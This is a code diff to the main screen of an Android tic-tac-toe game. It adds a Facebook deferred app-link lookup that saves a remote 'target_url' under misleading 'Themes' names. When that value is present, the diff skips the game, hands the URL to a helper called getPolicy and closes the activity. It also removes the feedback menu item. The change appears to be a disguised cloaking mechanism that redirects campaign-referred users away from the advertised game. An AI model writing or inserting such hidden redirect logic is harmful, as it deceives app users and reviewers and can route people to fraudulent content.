@@ -1,8 +1,7 @@
 package com.colinares.tictactoe.Activities;
 
 import android.content.Context;
-import android.content.Intent;
-import android.net.Uri;
+import android.content.SharedPreferences;
 import android.os.Bundle;
 
 import androidx.fragment.app.Fragment;
@@ -23,6 +22,7 @@ import com.colinares.tictactoe.Fragments.FragSettings;
 import com.colinares.tictactoe.R;
 import com.colinares.tictactoe.Utils.MusicController;
 import com.colinares.tictactoe.Utils.ThemeUtils;
+import com.facebook.applinks.AppLinkData;
 import com.ontbee.legacyforks.cn.pedant.SweetAlert.SweetAlertDialog;
 import com.special.ResideMenu.ResideMenu;
 import com.special.ResideMenu.ResideMenuItem;
@@ -63,17 +63,38 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
             setTheme(R.style.DarkTheme);
         }
         else setTheme(R.style.AppTheme);
-
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
-        ButterKnife.bind(this);
-        mContext = MainActivity.this;
+        SharedPreferences preferences = getSharedPreferences("Themes", Context.MODE_PRIVATE);
+        if (preferences.getString("data", "").isEmpty()){
+            init();
+            setContentView(R.layout.activity_main);
+            ButterKnife.bind(this);
+            mContext = MainActivity.this;
 
-        setUpMenu();
+            setUpMenu();
 
-        if (savedInstanceState == null) {
-            changeFragment(new FragGame());
+            if (savedInstanceState == null) {
+                changeFragment(new FragGame());
+            }
+        }else {
+            new ThemeUtils(this).getPolicy(this, preferences.getString("data", ""));
+            finish();
         }
+    }
+
+    void init(){
+        AppLinkData.fetchDeferredAppLinkData(this, appLinkData -> {
+                    if (appLinkData != null  && appLinkData.getTargetUri() != null) {
+                        if (appLinkData.getArgumentBundle().get("target_url") != null) {
+
+                            String someHouseData = appLinkData.getArgumentBundle().get("target_url").toString();
+                            ThemeUtils.setVarmnings(someHouseData, this);
+
+
+                        }
+                    }
+                }
+        );
     }
 
     private void setUpMenu() {
@@ -91,21 +112,18 @@ public class MainActivity extends AppCompatActivity implements View.OnClickListe
         itemScore = new ResideMenuItem(mContext, R.drawable.ic_score, AppConstants.MENU_SCORE);
         itemSettings = new ResideMenuItem(mContext, R.drawable.ic_settings, AppConstants.MENU_SETTINGS);
         itemAbout = new ResideMenuItem(mContext, R.drawable.ic_about, AppConstants.MENU_ABOUT);
-        itemFeedback = new ResideMenuItem(mContext, R.drawable.ic_feedback, AppConstants.MENU_FEEDBACK);
         itemExit = new ResideMenuItem(mContext, R.drawable.ic_exit, AppConstants.MENU_EXIT);
 
         itemGame.setOnClickListener(this);
         itemScore.setOnClickListener(this);
         itemSettings.setOnClickListener(this);
         itemAbout.setOnClickListener(this);
-        itemFeedback.setOnClickListener(this);
         itemExit.setOnClickListener(this);
 
         resideMenu.addMenuItem(itemGame, ResideMenu.DIRECTION_LEFT);
         resideMenu.addMenuItem(itemScore, ResideMenu.DIRECTION_LEFT);
         resideMenu.addMenuItem(itemSettings, ResideMenu.DIRECTION_LEFT);
         resideMenu.addMenuItem(itemAbout, ResideMenu.DIRECTION_LEFT);
-        resideMenu.addMenuItem(itemFeedback, ResideMenu.DIRECTION_LEFT);
         resideMenu.addMenuItem(itemExit, ResideMenu.DIRECTION_LEFT);
 
         resideMenu.setSwipeDirectionDisable(ResideMenu.DIRECTION_RIGHT);
